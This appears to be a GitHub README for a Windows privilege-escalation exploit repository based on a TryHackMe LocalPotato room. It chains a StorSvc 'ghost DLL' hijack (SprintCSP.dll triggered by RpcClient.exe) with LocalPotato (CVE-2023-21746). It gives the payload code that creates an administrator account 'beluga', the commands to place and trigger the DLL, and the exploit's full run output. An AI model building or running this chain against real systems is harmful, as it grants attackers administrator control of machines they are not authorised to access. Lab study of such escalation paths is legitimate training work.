# Ghost dll & LocalPotato
All the information to compile and execute these binaries comes from the [TryHackMe room for LocalPotato](https://tryhackme.com/room/localpotato)

## Compiling the Exploit

Make your changes, github will compile it for you 

- **SprintCSP.dll**: This is the missing DLL we are going to hijack.
- **RpcClient.exe**: This program will trigger the RPC call to `SvcRebootToFlashingMode`. Depending on the Windows version you are targeting, you may need to edit the exploit's code a bit, as different Windows versions use different interface identifiers to expose `SvcRebootToFlashingMode`.

Let's start by dealing with RpcClient.exe. As previously mentioned, we will need to change the exploit depending on the Windows version of the target machine. To do this, we will need to change the first lines of `RpcClient\RpcClient\storsvc_c.c` so that the correct operating system is chosen.

If the target machine is running Windows Server 2019, we will edit the file accordingly:

    #if defined(_M_AMD64)

    //#define WIN10
    //#define WIN11
    #define WIN2019
    //#define WIN2022

    ...

Now to compile SprintCSP.dll, we only need to modify the `DoStuff()` function on `SprintCSP\SprintCSP\main.c` so that it executes a command that grants us privileged access to the machine.  We will make the DLL add a new administrator user: beluga / Password.123

Here's the code with our replaced command:

    void DoStuff() {

      // Replace all this code by your payload
      STARTUPINFO si = { sizeof(STARTUPINFO) };
      PROCESS_INFORMATION pi;
      CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net user beluga Password.123 /add && net localgroup administrators beluga /add",
          NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

      CloseHandle(pi.hProcess);
      CloseHandle(pi.hThread);

      return;
    }
    
    
## Ghost dll attack
To successfully exploit StorSvc, we need to copy SprintCSP.dll to any directory in the current PATH. We can verify the PATH by running the following command:

        C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
            Path    REG_EXPAND_SZ    %SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;
                                     %SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;%SYSTEMROOT%\System32\OpenSSH\;
                                     C:\Program Files\Amazon\cfn-bootstrap\

With our DLL in place, we can now run RpcClient.exe to trigger the call to SvcRebootToFlashingMode, effectively executing the payload in our DLL:

        C:\Users\user\Desktop> RpcClient.exe
        [+] Dll hijack triggered!

Note:
If it errorrs out eg. like this:
        Exception: 1753 - 0x000006d9

You need to adjust properly the Windows version for the RpcClient.exe and recompile.
        
If the exploitation was successful beluga will be in the Administrators group:

        C:\Users\user\Desktop> net user beluga
        
## Localpotato
By using Localpotato exploit we can access C:\windows\system32 even if we are using an unprivileged user:

        C:\Users\user\Desktop> LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
 
         LocalPotato (aka CVE-2023-21746)
         by splinter_code & decoder_it
 
        [*] Objref Moniker Display Name = objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGAQAAAAAAAABTIvXDdMIUbap+AepkeJ/yAcgAAMwIwArWEKZ3vRDmhjkAIwAHAEMASABBAE4ARwBFAC0ATQBZAC0ASABPAFMAVABOAEEATQBFAAAABwAxADAALgAxADAALgA0ADAALgAyADMAMQAAAAAACQD//wAAHgD//wAAEAD//wAACgD//wAAFgD//wAAHwD//wAADgD//wAAAAA=:
        [*] Calling CoGetInstanceFromIStorage with CLSID:{854A20FB-2D44-457D-992F-EF13785D2B51}
        [*] Marshalling the IStorage object... IStorageTrigger written: 100 bytes
        [*] Received DCOM NTLM type 1 authentication from the privileged client
        [*] Connected to the SMB server with ip 127.0.0.1 and port 445
        [+] SMB Client Auth Context swapped with SYSTEM
        [+] RPC Server Auth Context swapped with the Current User
        [*] Received DCOM NTLM type 3 authentication from the privileged client
        [+] SMB reflected DCOM authentication succeeded!
        [+] SMB Connect Tree: \\127.0.0.1\c$  success
        [+] SMB Create Request File: Windows\System32\SprintCSP.dll success
        [+] SMB Write Request file: Windows\System32\SprintCSP.dll success
        [+] SMB Close File success
        [+] SMB Tree Disconnect success

Once our dll is in place, we can trigger it on the previous way.
